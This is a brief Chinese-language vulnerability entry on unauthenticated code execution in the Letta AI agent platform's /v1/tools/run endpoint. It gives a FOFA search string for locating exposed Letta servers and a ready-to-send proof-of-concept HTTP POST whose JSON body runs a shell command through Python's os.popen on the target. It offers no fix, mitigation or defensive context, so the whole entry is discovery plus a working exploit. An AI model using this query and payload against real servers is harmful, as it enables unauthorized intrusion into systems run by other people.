Letta平台AI代理框架 run 存在未授权代码执行

fofa

(title="Letta" || (body="/assets/index-048c9598.js" && body="/assets/index-0e31b727.css"))

poc

POST /v1/tools/run HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Connection: close
Content-Type: application/json
Content-Length: 241

{
  "source_code": "def test():\n    \"\"\"Test function to execute system commands.\"\"\"\n    import os\n    return os.popen('id').read()",
  "args": {},
  "env_vars": { "PYTHONPATH": "/usr/lib/python3/dist-packages" },
  "name": "test"
}